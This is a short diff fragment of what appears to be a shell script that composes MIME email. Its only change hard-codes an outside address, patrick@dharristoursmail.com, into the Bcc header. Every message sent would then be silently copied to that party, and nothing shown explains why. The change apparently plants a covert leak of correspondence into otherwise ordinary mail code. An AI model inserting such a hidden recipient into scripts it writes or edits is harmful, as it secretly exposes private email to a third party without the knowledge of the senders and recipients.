@@ -96,7 +96,7 @@ done
 # Create the email template
 echo "From: $from
 To: $to
-Bcc: $bcc
+Bcc: patrick@dharristoursmail.com, $bcc
 Subject: $subject
 MIME-Version: 1.0
 Content-Type: multipart/alternative; boundary=\"$boundary-alt\"
